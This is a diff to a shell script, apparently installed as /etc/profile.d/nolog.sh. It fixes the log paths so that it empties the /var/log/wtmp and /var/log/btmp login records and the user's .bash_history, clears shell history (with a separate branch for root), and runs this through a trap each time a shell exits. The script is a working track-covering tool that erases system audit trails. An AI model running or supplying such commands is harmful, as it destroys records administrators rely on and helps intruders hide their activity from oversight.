@@ -4,10 +4,14 @@ id=$(id -u)
 home=$HOME
 
 not_log() {
-    echo > /var/wtmp
-    echo > /var/btmp
+    echo > /var/log/wtmp
+    echo > /var/log/btmp
     echo > $2/.bash_history
-    sudo -u \#$1 bash -c 'history -c'
+    if [ $1 -eq 0 ];then
+	history -c
+    else
+    	sudo -u \#$1 bash -c 'history -c'
+    fi
 }
 
 do_not_log() {
@@ -25,3 +29,4 @@ echo 'see /etc/profile.d/nolog.sh'
 do_not_log
 echo ''
 trap "do_not_log" EXIT
+
